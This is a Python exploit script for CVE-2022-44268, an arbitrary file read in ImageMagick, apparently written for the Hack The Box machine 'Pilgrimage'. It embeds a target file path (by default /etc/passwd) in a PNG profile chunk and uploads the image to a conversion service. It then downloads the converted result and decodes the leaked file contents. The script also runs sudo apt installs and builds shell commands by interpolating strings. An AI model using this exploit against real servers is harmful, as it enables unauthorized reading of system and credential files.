#!/usr/bin/python3

import os
import subprocess
import sys
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 
try:
    import argparse
    import imghdr
    import re
    import requests
    from pwn import log
except ImportError:
    os.system('/usr/bin/python3 -m pip install pwntools argparse imghdr requests re')

def exploit(package, png, read):
    install = subprocess.run([f'/usr/bin/sudo /usr/bin/apt install pngcrush exiv2 imagemagick -y'], shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    path = subprocess.run([f'/usr/bin/which {package}'], shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if os.path.isfile(png):
        if imghdr.what(png) == 'png':
            if package == 'pngcrush':
                pngcrush(path.stdout.strip("\n"), read, png)
            elif package == 'exiv2':
                exiv2(path.stdout.strip("\n"))
        else:
            log.error(f'{png} is not PNG!')
    else:
        log.error(f'{png} not found!')
    
def pngcrush(path, read, png):
    command = f'{path} -text a "profile" "{read}" {png}'
    log.info(f'Executing: {command}')
    c = subprocess.run([command], shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
def exiv2(path):
    command = f'{path} -pS pngout.png'
    log.info(f'Executing: {command}')
    c = subprocess.run([command], shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    log.success(c.stdout)
    
def upload(url):
    # This is for hackthebox (pilgrimage) only
    files = {'toConvert': open('pngout.png','rb')}
    r = requests.post(url, files=files, allow_redirects=False)
    getURL = re.search('/?message=(.*?)&status=success', r.headers['Location'])
    output = 'output.png'
    log.success('Uploaded: pngout.png')
    if getURL is not None:
        # log.success(f'Uploaded URL: {getURL.group(1)}')
        r = requests.get(getURL.group(1))
        with open(output, 'wb') as f:
            f.write(r.content)
            f.close()
    log.success(f'Downloaded: {getURL.group(1)}')
    return output
            
def readContent(file):
    path = subprocess.run([f'/usr/bin/which identify'], shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    command = path.stdout.strip('\n') + " -verbose " + file + " | grep -e '[0-9a-f]\{32\}' | grep -v '[sS]ignature' | tr -d '\\n'"
    log.info(f'Executing: {command}')
    read = subprocess.run([command], shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    log.success('Output:')
    print(bytes.fromhex(read.stdout).decode('utf-8', errors='ignore').replace('\x00',''))
            
if __name__ == '__main__':
    packages = ['pngcrush', 'exiv2', 'convert']
    parser = argparse.ArgumentParser(description='CVE-2022-44268: ImageMagick Arbitrary File Read')
    parser.add_argument('action', choices=('create', 'upload', 'read'))
    parser.add_argument('-u', '--url', help='Upload URL', default='http://pilgrimage.htb/')
    parser.add_argument('-p', '--png', help='PNG file to use', default='blue.png')
    parser.add_argument('-r', '--read', help='File to read', default='/etc/passwd')
    parser.add_argument('-f', '--file', help='PNG file to read bytes', default='output.png')
    args = parser.parse_args()
    
    if args.action == 'create':
        if args.png and args.read is not None:
            for package in packages:
                exploit(package, args.png, args.read)
            log.success('Created: pngout.png')
        else:
            log.error('Missing --png/--read arguments!')
    elif args.action == 'upload':
        if args.png and args.read and args.url is not None:
            for package in packages:
                exploit(package, args.png, args.read)
            log.success('Created: pngout.png')
            readContent(upload(args.url))
        else:
            log.error('Missing --png/--read/--url arguments!')
    elif args.action == 'read':
        if args.file is not None:
            readContent(args.file)
        else:
            log.error('Missing --file arguments!')